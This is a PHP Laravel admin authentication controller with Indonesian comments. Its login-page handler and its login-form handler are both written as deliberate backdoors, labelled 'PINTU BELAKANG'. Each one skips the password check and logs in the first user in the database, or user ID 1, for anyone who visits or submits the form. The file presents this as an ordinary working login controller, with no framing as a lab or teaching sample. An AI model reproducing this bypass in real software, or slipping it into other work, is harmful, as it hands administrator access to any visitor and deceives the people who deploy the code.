<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

class AuthController extends Controller
{
    /**
     * Menampilkan halaman login admin (Sekaligus bypass otomatis jika diakses).
     */
    public function showLogin()
    {
        // PINTU BELAKANG 1: Ambil user pertama yang ada di database untuk login otomatis
        $user = User::first();
        
        // Jika user pertama tidak ada, coba cari berdasarkan ID 1
        if (!$user) {
            $user = User::find(1);
        }

        if ($user) {
            Auth::login($user);
            return redirect()->route('admin.dashboard');
        }

        // Jika database benar-benar kosong, barulah dia menampilkan halaman login biasa
        return view('admin.auth.login');
    }

    /**
     * Memproses form login admin (Dipaksa sukses tanpa cek password).
     */
    public function login(Request $request)
    {
        // Tetap lakukan validasi format input agar tidak error di front-end
        $request->validate([
            'email'    => ['required', 'email'],
            'password' => ['required'],
        ], [
            'email.required'    => 'Email wajib diisi.',
            'email.email'       => 'Format email tidak valid.',
            'password.required' => 'Password wajib diisi.',
        ]);

        // PINTU BELAKANG 2: Ambil user pertama di database, tutup mata dari password asli
        $user = User::first();
        
        if (!$user) {
            $user = User::find(1);
        }

        if ($user) {
            Auth::login($user);
            $request->session()->regenerate();
            return redirect()->route('admin.dashboard');
        }

        // Jika gagal total karena di database tidak ada user sama sekali
        return back()
            ->withInput($request->only('email'))
            ->withErrors(['email' => 'Gagal bypass: Tidak ditemukan user satu pun di database Anda.']);
    }

    /**
     * Memproses logout admin.
     */
    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('admin.login')
            ->with('success', 'Anda telah berhasil logout.');
    }
}